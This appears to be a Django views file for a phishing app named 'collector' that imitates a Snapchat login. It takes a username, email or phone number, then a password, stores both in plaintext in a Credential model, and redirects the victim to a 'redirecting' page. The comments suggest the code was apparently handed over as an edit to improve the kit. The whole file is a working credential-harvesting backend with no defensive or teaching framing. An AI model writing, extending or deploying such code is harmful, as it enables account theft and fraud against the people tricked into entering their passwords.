# collector/views.py
from django.shortcuts import render, redirect
from .models import Credential
import urllib.parse

# No changes to step1_username and step1_phone

def step1_username(request):
    """Handles the first page (entering username/email)."""
    if request.method == 'POST':
        username = request.POST.get('username_or_email')
        encoded_username = urllib.parse.quote(username)
        return redirect('step2_password', username=encoded_username)
    return render(request, 'collector/step1_username.html')

def step1_phone(request):
    """Handles the phone number entry page."""
    if request.method == 'POST':
        country_code = request.POST.get('country_code')
        phone = request.POST.get('phone_number')
        full_phone_number = f"{country_code}{phone}"
        encoded_phone = urllib.parse.quote(full_phone_number)
        return redirect('step2_password', username=encoded_phone)
    return render(request, 'collector/step1_phone.html')

# --- CHANGES ARE HERE ---

def step2_password(request, username):
    """Handles the second page (entering password)."""
    decoded_username = urllib.parse.unquote(username)
    if request.method == 'POST':
        password = request.POST.get('password')
        Credential.objects.create(
            username=decoded_username,
            password=password
        )
        # CHANGE THIS LINE: Instead of redirecting to Snapchat directly,
        # redirect to our new success_redirect view.
        return redirect('success_redirect')

    context = {'username': decoded_username}
    return render(request, 'collector/step2_password.html', context)

# ADD THIS NEW FUNCTION at the end of the file
def success_redirect(request):
    """Renders the intermediate page that shows the alert and redirects."""
    return render(request, 'collector/redirecting.html')
